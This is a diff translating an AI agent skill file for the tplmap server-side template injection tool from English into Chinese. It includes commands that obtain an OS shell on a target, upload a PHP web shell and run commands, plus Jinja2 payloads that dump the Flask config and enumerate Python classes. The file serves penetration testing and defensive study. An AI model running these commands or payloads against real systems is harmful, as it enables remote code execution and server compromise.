@@ -1,66 +1,63 @@
 ---
 name: tplmap
 description: >
-  This skill should be used when the user asks about "tplmap", "testing for
-  SSTI vulnerabilities in Jinja2, Twig, Smarty, Mako, and other template
-  engines to achieve RCE". Automatic Server-Side Template Injection detection
-  and exploitation across 18+ template engines.
+  此技能适用于用户询问关于 "tplmap"、"测试 Jinja2、Twig、Smarty、Mako 及其他模板引擎中的 SSTI 漏洞以实现 RCE"。支持 18+ 模板引擎的自动化服务端模板注入 (Server-Side Template Injection) 检测与利用工具。
 ---
 
 # Tplmap
 
-Automatic SSTI detection and exploitation — 18+ template engines.
+自动化 SSTI 检测与利用 —— 支持 18+ 模板引擎。
 
-## Quick Start
+## 快速开始
 
 ```bash
 git clone https://github.com/epinna/tplmap
 cd tplmap && pip install -r requirements.txt
 
-# Detect SSTI
+# 检测 SSTI
 python2 tplmap.py -u "http://target.com/page?name=*"
 
-# Shell via SSTI
+# 通过 SSTI 获取 Shell
 python2 tplmap.py -u "http://target.com/page?name=*" --os-shell
 
-# Upload file via SSTI
+# 通过 SSTI 上传文件
 python2 tplmap.py -u "http://target.com/page?name=*" --upload /local/shell.php /var/www/html/shell.php
 ```
 
-## Core Flags
+## 核心参数
 
-| Flag | Purpose |
+| 参数 | 用途 |
 |------|---------|
-| `-u URL` | Target URL (mark injection with `*`) |
-| `-d "k=v"` | POST data |
-| `-H "K:V"` | Custom header |
-| `--os-shell` | Interactive OS shell |
-| `--os-cmd CMD` | Run single command |
-| `--upload src dst` | Upload file |
-| `--download src dst` | Download file |
-| `--engine E` | Force specific engine |
-| `--level N` | Detection level (1-5) |
+| `-u URL` | 目标 URL（用 `*` 标记注入点） |
+| `-d "k=v"` | POST 数据 |
+| `-H "K:V"` | 自定义请求头 |
+| `--os-shell` | 交互式 OS Shell |
+| `--os-cmd CMD` | 执行单条命令 |
+| `--upload src dst` | 上传文件 |
+| `--download src dst` | 下载文件 |
+| `--engine E` | 强制指定模板引擎 |
+| `--level N` | 检测深度（1-5） |
 
-## Supported Engines
+## 支持的模板引擎
 
 Jinja2 · Twig · Smarty · Mako · Pebble · Jade · Tornado · Velocity · Freemarker · Cheetah · ERB · EJS · DustJS · Nunjucks · Marko
 
-## Common Workflows
+## 常用工作流
 
-**Jinja2 manual verify:**
+**Jinja2 手动验证：**
 ```
-{{7*7}} → 49 in response = confirmed
-{{config}} → dump Flask config
-{{''.__class__.__mro__[1].__subclasses__()}} → list classes
+{{7*7}} → 响应中出现 49 = 确认存在注入
+{{config}} → 导出 Flask 配置
+{{''.__class__.__mro__[1].__subclasses__()}} → 列举所有类
 ```
 
-**Automated RCE:**
+**自动化 RCE：**
 ```bash
 python2 tplmap.py -u "http://target.com/render?tmpl=*" --os-shell
 ```
 
-## Resources
+## 参考资源
 
-| File | When to load |
+| 文件 | 何时加载 |
 |------|--------------|
-| `references/` | Manual SSTI payloads per engine |
+| `references/` | 各模板引擎的手动 SSTI payload |
